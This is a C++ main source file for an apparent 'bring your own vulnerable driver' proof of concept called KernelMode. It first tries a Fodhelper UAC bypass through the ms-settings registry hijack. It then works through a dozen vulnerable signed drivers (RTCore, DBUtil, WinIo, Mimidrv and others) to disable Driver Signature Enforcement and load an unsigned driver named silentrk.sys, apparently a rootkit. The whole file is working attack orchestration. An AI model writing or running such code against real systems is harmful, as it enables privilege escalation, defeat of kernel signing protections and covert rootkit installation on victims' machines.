/**
 * @file main.cpp
 * @author Gregory King
 * @date August 13, 2025
 * @brief Main entry point for the KernelMode toolkit.
 *
 * This file contains the main function which automatically attempts to load
 * the silentrk.sys driver using all available vulnerability providers.
 */

#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <fstream>
#include <chrono>
#include <ctime>
#include <thread>
#include <Windows.h>
#include <vector>
#include <memory>
#include <filesystem>

// Headers for providers and managers
#include "Providers/GdrvProvider.h"
#include "Providers/RTCoreProvider.h"
#include "Providers/DBUtilProvider.h"
#include "Providers/WinIoProvider.h"
#include "Providers/IntelPmxProvider.h"
#include "Providers/NeacSafe64Provider.h"
#include "Providers/IntelNalProvider.h"
#include "Providers/ProcessExplorerProvider.h"
#include "Providers/ProcessHackerProvider.h"
#include "Providers/WinRing0Provider.h"
#include "Providers/AsrDrvProvider.h"
#include "Providers/MimidrvProvider.h"
#include "Providers/EchoDrvProvider.h"
#include "DSE.h"
#include "ServiceManager.h"
#include "UACBypass.h"

// Global log file for console output
std::ofstream g_logFile;

/**
 * @brief Checks if the current process is running with administrator privileges.
 * @return True if running as admin, false otherwise.
 */
bool IsRunningAsAdmin() {
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    PSID administratorsGroup;

    if (AllocateAndInitializeSid(
        &ntAuthority,
        2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0,
        &administratorsGroup))
    {
        if (!CheckTokenMembership(NULL, administratorsGroup, &isAdmin)) {
            isAdmin = FALSE;
        }
        FreeSid(administratorsGroup);
    }

    return isAdmin == TRUE;
}

/**
 * @brief Attempts to load the SilentRK driver using all available providers.
 * @return True if successful, false otherwise.
 */
bool TryLoadSilentRK() {
    // Robust path discovery
    wchar_t exePathBuffer[MAX_PATH];
    GetModuleFileNameW(NULL, exePathBuffer, MAX_PATH);
    std::filesystem::path exePath(exePathBuffer);
    std::filesystem::path exeDir = exePath.parent_path();
    
    std::vector<std::filesystem::path> searchPaths;
    searchPaths.push_back(exeDir / "silentrk.sys");
    searchPaths.push_back(exeDir.parent_path() / "silentrk.sys"); 
    searchPaths.push_back(exeDir.parent_path().parent_path() / "silentrk.sys"); 
    searchPaths.push_back(L"C:\\Users\\admin\\Documents\\Visual Studio 2022\\Projects\\SilentRK\\x64\\Release\\silentrk.sys");

    std::wstring driverPath;
    bool found = false;
    std::error_code ec;
    
    for (const auto& path : searchPaths) {
        if (std::filesystem::exists(path, ec)) {
            driverPath = path.wstring();
            found = true;
            break;
        }
    }

    if (!found) {
        std::wcerr << L"[-] SilentRK driver not found at any location!" << std::endl;
        wchar_t currentDir[MAX_PATH];
        GetCurrentDirectoryW(MAX_PATH, currentDir);
        std::wcerr << L"[*] Current Dir: " << currentDir << std::endl;
        std::wcerr << L"[*] Exe Dir: " << exeDir.wstring() << std::endl;
        if (g_logFile.is_open()) g_logFile << "[-] SilentRK driver not found at any location!" << std::endl;
        return false;
    }

    std::wcout << L"[+] Targeted SilentRK Driver: " << driverPath << std::endl;

    // Initialize Service Manager for cleanup/installation
    KernelMode::ServiceManager sm(L"SilentRKController");
    // Ensure clean state
    sm.StopAndDeleteService(L"SilentRK");

    // List of providers to attempt
    std::vector<std::shared_ptr<KernelMode::Providers::IProvider>> providers;
    // Skip working providers for debugging others
    // providers.push_back(std::make_shared<KernelMode::Providers::GdrvProvider>());
    providers.push_back(std::make_shared<KernelMode::Providers::RTCoreProvider>());
    providers.push_back(std::make_shared<KernelMode::Providers::DBUtilProvider>());
    providers.push_back(std::make_shared<KernelMode::Providers::WinIoProvider>());
    providers.push_back(std::make_shared<KernelMode::Providers::IntelPmxProvider>());
    providers.push_back(std::make_shared<KernelMode::Providers::NeacSafe64Provider>());
    // providers.push_back(std::make_shared<KernelMode::Providers::IntelNalProvider>());
    providers.push_back(std::make_shared<KernelMode::Providers::ProcessExplorerProvider>());
    providers.push_back(std::make_shared<KernelMode::Providers::ProcessHackerProvider>());
    providers.push_back(std::make_shared<KernelMode::Providers::WinRing0Provider>());
    providers.push_back(std::make_shared<KernelMode::Providers::AsrDrvProvider>());
    providers.push_back(std::make_shared<KernelMode::Providers::MimidrvProvider>());
    providers.push_back(std::make_shared<KernelMode::Providers::EchoDrvProvider>());

    // LIFECYCLE-024 FIX: Iterate through ALL providers with proper error handling and fallback
    std::wcout << L"\n[*] Total providers available: " << providers.size() << std::endl;
    int providerAttempts = 0;
    bool anyProviderSucceeded = false;
    
    for (auto& provider : providers) {
        providerAttempts++;
        std::wcout << L"\n============================================================" << std::endl;
        std::wcout << L"[*] Provider attempt " << providerAttempts << L"/" << providers.size() << L": " << provider->GetProviderName() << std::endl;
        std::wcout << L"============================================================" << std::endl;
        
        if (g_logFile.is_open()) {
            g_logFile << "\n[*] Provider attempt " << providerAttempts << "/" << providers.size() << std::endl;
        }

        // --- BUG-C003 FIX: Wrap initialization in try-catch for exception safety ---
        bool providerInitialized = false;
        try {
            std::wcout << L"[*] Calling provider->Initialize()..." << std::endl;
            providerInitialized = provider->Initialize();
            std::wcout << L"[*] Initialize() returned: " << (providerInitialized ? L"true" : L"false") << std::endl;
        } catch (const std::exception& e) {
            std::cout << "[-] Exception during provider initialization: " << e.what() << std::endl;
            if (g_logFile.is_open()) g_logFile << "[-] Exception: " << e.what() << std::endl;
            continue;  // Try next provider
        } catch (...) {
            std::wcout << L"[-] Unknown exception during provider initialization." << std::endl;
            if (g_logFile.is_open()) g_logFile << "[-] Unknown exception during initialization" << std::endl;
            continue;  // Try next provider
        }
        
        if (!providerInitialized) {
            std::wcout << L"[-] Provider " << provider->GetProviderName() << L" initialization FAILED." << std::endl;
            std::wcout << L"[-] Trying next provider..." << std::endl;
            if (g_logFile.is_open()) {
                std::wstring validName = provider->GetProviderName();
                g_logFile << "[-] Provider initialization returned false for: " << std::string(validName.begin(), validName.end()) << std::endl;
            }
            continue;  // Try next provider
        }
        
        // LIFECYCLE-011: Check if provider is in error state
        if (provider->IsInErrorState()) {
            std::wcout << L"[-] Provider is in error state, skipping." << std::endl;
            provider->Deinitialize();
            continue;  // Try next provider
        }
        // -------------------------------------------------------------------------

        std::wcout << L"[+] Provider initialized successfully. Attempting DSE Bypass..." << std::endl;
        if (g_logFile.is_open()) g_logFile << "[+] Provider initialized. Attempting DSE Bypass..." << std::endl;

        try {
            KernelMode::DSE dse(provider.get());
            if (dse.Disable()) {
                std::wcout << L"[+] DSE Disabled successfully. Attempting to load SilentRK..." << std::endl;
                if (g_logFile.is_open()) g_logFile << "[+] DSE Disabled successfully." << std::endl;
                
                auto info = sm.InstallDriverService(L"SilentRK", driverPath, L"Silent RK Driver");
                if (info.status != KernelMode::ServiceStatus::ERROR_STATE) {
                     std::wcout << L"[+] Service installed: " << info.serviceName << std::endl;
                     
                     if (sm.StartDriverService(info.serviceName)) {
                         std::wcout << L"[SUCCESS] SilentRK driver loaded successfully using " << provider->GetProviderName() << L"!" << std::endl;
                         if (g_logFile.is_open()) {
                             std::wstring name = provider->GetProviderName();
                             g_logFile << "[SUCCESS] SilentRK driver loaded successfully using " << std::string(name.begin(), name.end()) << "!" << std::endl;
                         }
                         
                         // LIFECYCLE-031 FIX: Enforce cleanup order with retry mechanism
                         std::wcout << L"[*] Restoring DSE..." << std::endl;
                         bool restored = false;
                         for (int retry = 0; retry < 3 && !restored; retry++) {
                             if (retry > 0) {
                                 std::wcout << L"[*] DSE restore retry attempt " << retry << L"/3" << std::endl;
                                 std::this_thread::sleep_for(std::chrono::milliseconds(500));
                             }
                             restored = dse.Restore();
                         }
                         
                         if (!restored) {
                             std::wcerr << L"[-] WARNING: Failed to restore DSE after 3 attempts!" << std::endl;
                         }
                         
                         // Clean up service
                         std::wcout << L"[*] Stopping and deleting SilentRK service..." << std::endl;
                         sm.StopAndDeleteService(info.serviceName);

                         // Only deinitialize provider after DSE restoration attempt
                         provider->Deinitialize();
                         anyProviderSucceeded = true;
                         std::wcout << L"[+] Stopping iteration after successful load to prevent conflict." << std::endl;
                         return true;
                     } else {
                         std::wcout << L"[-] Failed to start SilentRK service." << std::endl;
                         if (g_logFile.is_open()) g_logFile << "[-] Failed to start SilentRK service." << std::endl;
                     }
                } else {
                    std::wcout << L"[-] Failed to install SilentRK service." << std::endl;
                    if (g_logFile.is_open()) g_logFile << "[-] Failed to install SilentRK service." << std::endl;
                }
                
                // Cleanup failed attempt
                std::wcout << L"[*] Cleaning up service..." << std::endl;
                sm.StopAndDeleteService(L"SilentRK");
                
                std::wcout << L"[*] Restoring DSE..." << std::endl;
                dse.Restore();

            } else {
                std::wcout << L"[-] Failed to disable DSE." << std::endl;
                if (g_logFile.is_open()) g_logFile << "[-] Failed to disable DSE." << std::endl;
            }
        } catch (const std::exception& e) {
            std::cout << "[-] Exception during utilization: " << e.what() << std::endl;
            if (g_logFile.is_open()) g_logFile << "[-] Exception during utilization: " << e.what() << std::endl;
        } catch (...) {
            std::wcout << L"[-] Unknown exception during utilization." << std::endl;
            if (g_logFile.is_open()) g_logFile << "[-] Unknown exception during utilization." << std::endl;
        }

        // Clean up provider before next attempt
        provider->Deinitialize();
    }
    
    // LIFECYCLE-024: All providers failed or completed
    std::wcout << L"\n====================================================================" << std::endl;
    
    if (anyProviderSucceeded) {
        std::wcout << L"[+] COMPLETED: Testing finished. At least one provider succeeded." << std::endl;
        std::wcout << L"====================================================================" << std::endl;
        return true;
    }

    std::wcout << L"[-] FAILED: All " << providerAttempts << L" provider(s) attempted without success." << std::endl;
    std::wcout << L"[-] No vulnerable driver could be exploited to load SilentRK." << std::endl;
    std::wcout << L"====================================================================" << std::endl;
    
    return false;
}

/**
 * @brief The main entry point of the application.
 * @return 0 on successful execution, 1 on error.
 */
int main(int argc, char* argv[]) {
    // Check for headless/test mode
    bool headless = false;
    if (argc > 1) {
        for (int i = 1; i < argc; i++) {
            if (std::string(argv[i]) == "--headless") {
                headless = true;
                break;
            }
        }
    }

    if (headless) {
        std::wcout << L"[DEBUG] Headless mode enabled." << std::endl;
        if (!IsRunningAsAdmin()) {
             std::wcout << L"[DEBUG] Headless + Non-Admin: Attempting UAC bypass (Fodhelper)..." << std::endl;
             if (KernelMode::UACBypass::AttemptFodhelperBypass(L"--headless")) {
                 std::wcout << L"[+] Bypass triggered. Exiting non-elevated instance." << std::endl;
                 return 0;
             } else {
                 std::wcerr << L"[-] Bypass failed." << std::endl;
                 // Continue anyway - likely to fail later but required by logic
             }
        }
    } else {
        // Normal interactive mode: Check for Admin
        if (!IsRunningAsAdmin()) {
            std::wcout << L"[-] Not running as administrator. Attempting UAC bypass (Fodhelper)..." << std::endl;
            
            // LIFECYCLE-009: Attempt UAC bypass if not admin
            static bool attemptedBypass = false;
            if (!attemptedBypass) {
                 attemptedBypass = true;
                 if (KernelMode::UACBypass::AttemptFodhelperBypass()) {
                     std::wcout << L"[+] Bypass triggered. Exiting non-elevated instance." << std::endl;
                     return 0;
                 } else {
                     std::wcerr << L"[-] Bypass failed." << std::endl;
                 }
            }
        }
    }

    // Initialize console logging to file - use absolute path to handle UAC CWD changes
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    // Exe is in x64/Debug/Name.exe -> We want Root/Name_log.txt
    // parent(x64/Debug) -> x64
    // parent(x64) -> Root
    std::filesystem::path logPath = std::filesystem::path(exePath).parent_path().parent_path().parent_path().append("BYOVD-POC_log.txt"); 
    
    // Fallback if that structure is unexpected (e.g. flat release build), just put it next to exe
    if (!std::filesystem::exists(logPath.parent_path())) {
         logPath = std::filesystem::path(exePath).parent_path().append("BYOVD-POC_log.txt");
    }

    // Force log path to root project dir for consistency with test expectations if possible
    // (C:\Users\admin\Documents\Visual Studio 2022\Projects\BYOVD-POC\BYOVD-POC_log.txt)
    // Adjust based on where we think we are: x64/Debug/../../BYOVD-POC_log.txt
    
    g_logFile.open(logPath, std::ios::out | std::ios::app);
    if (g_logFile.is_open()) {
        auto now = std::chrono::system_clock::now();
        auto time_t = std::chrono::system_clock::to_time_t(now);
        g_logFile << "\n========== BYOVD-POC Auto-Loader Session Started: " << std::ctime(&time_t) << "==========" << std::endl;
        g_logFile << "[*] Execution Path: " << exePath << std::endl;
        if (headless) g_logFile << "[*] Mode: Headless" << std::endl;
        g_logFile << "[*] Admin: " << (IsRunningAsAdmin() ? "Yes" : "No") << std::endl;
    }
    
    // Cleanup UAC bypass artifacts if we are running as admin (and potentially were spawned by it)
    // We use RegDeleteTreeW to ensure we remove the entire hijacked structure (ms-settings/Shell/Open/command)
    HKEY hKeyClasses;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Classes", 0, KEY_ALL_ACCESS, &hKeyClasses) == ERROR_SUCCESS) {
        RegDeleteTreeW(hKeyClasses, L"ms-settings");
        RegCloseKey(hKeyClasses);
    }

    try {
        std::wcout << L"====================================================" << std::endl;
        std::wcout << L"         KernelMode - SilentRK Auto-Loader" << std::endl;
        std::wcout << L"====================================================" << std::endl;

        if (TryLoadSilentRK()) {
            std::wcout << L"\n[***] MISSION ACCOMPLISHED: Driver Loaded. [***]" << std::endl;
            if (g_logFile.is_open()) g_logFile << "[+] Mission Accomplished: Driver Loaded" << std::endl;
        } else {
            std::wcout << L"\n[FAILED] Could not load driver with any provider." << std::endl;
            if (g_logFile.is_open()) g_logFile << "[-] Failed to load driver with any provider" << std::endl;
        }
        
    } catch (const std::exception& e) {
        std::cerr << "An unhandled exception occurred: " << e.what() << std::endl;
        if (g_logFile.is_open()) g_logFile << "[-] Unhandled exception: " << e.what() << std::endl;
        return 1;
    }

    if (g_logFile.is_open()) {
        g_logFile << "\n========== BYOVD-POC Session Ended ==========" << std::endl;
        g_logFile.close();
    }
    
    // Keep console open unless headless
    if (!headless) {
        // std::wcout << L"\nPress any key to exit..." << std::endl;
        // system("pause > nul");
    }

    return 0;
}
